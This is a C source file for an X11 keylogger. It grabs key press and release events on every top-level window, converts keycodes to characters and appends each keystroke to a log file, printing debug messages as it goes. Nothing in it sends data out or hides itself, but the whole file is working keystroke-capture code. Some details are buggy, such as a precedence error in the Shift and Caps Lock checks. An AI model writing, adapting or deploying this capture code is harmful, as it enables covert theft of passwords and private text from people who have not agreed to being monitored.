#include "keylogger.h"

int main()
{
	Display *display = XOpenDisplay(NULL);

	if (display == NULL) {
		fprintf(stderr, "Unable to open X display\n");
		fflush(stdout);
		return 1;
	}

	Window root = DefaultRootWindow(display);

	unsigned long nwindows;
	Window *windows = getAllWindows(display, root, &nwindows);
	if (windows) {
		for (unsigned long i = 0; i < nwindows; i++) {
			XSelectInput(display, windows[i], KeyPressMask | KeyReleaseMask);
            		XGrabKey(display, AnyKey, AnyModifier, windows[i], True, GrabModeAsync, GrabModeAsync);
        	}
        	XFree(windows);
	}

	logfile = fopen(logfileLocation, "a");
	if (logfile == NULL) {
		fprintf(stderr, "Unable to open log file: %s\n", logfileLocation);
		fflush(stdout);
		return 1;
	}

	printf("Listening...\n");
	fflush(stdout);

	XEvent event;
	while (1) {
		printf("Waiting for event...\n");
		fflush(stdout);

		XNextEvent(display, &event);

		printf("Event captured!\n");
		fflush(stdout);

		if (event.xkey.type == KeyPress || event.xkey.type == KeyRelease) {
			char *key = convertKeyCode(
				&event,
				(event.xkey.state & ShiftMask != 0),
				(event.xkey.state & LockMask != 0)
			);
			
			if (key && logfile) {
				printf("logged...\n");
				fflush(stdout);
				fprintf(logfile,"%s\n", key);
				fflush(logfile);
				free(key);
			}
		}
	}
	
	fclose(logfile);
	XCloseDisplay(display);
	return 0;
}

Window *getAllWindows(Display *display, Window root, unsigned long *nwindows)
{
	Window parent;
	Window *children;
	unsigned int num_children;

	if (XQueryTree(display, root, &root, &parent, &children, &num_children) == 0) return NULL;

	*nwindows = num_children;
	return children;
}

char *convertKeyCode(XEvent *event, bool isShift, bool isCapsLock) 
{
	KeySym keySym;
	char buffer[32];

	int len = XLookupString(&event->xkey, buffer, sizeof(buffer) - 1, &keySym, NULL);
        buffer[len] = '\0';  // Null-terminate the string

	char *result = malloc(len+1);
	if (result) strcpy(result, buffer);

	printf("Result: %s\n", result);
	fflush(stdout);

	return result;
}
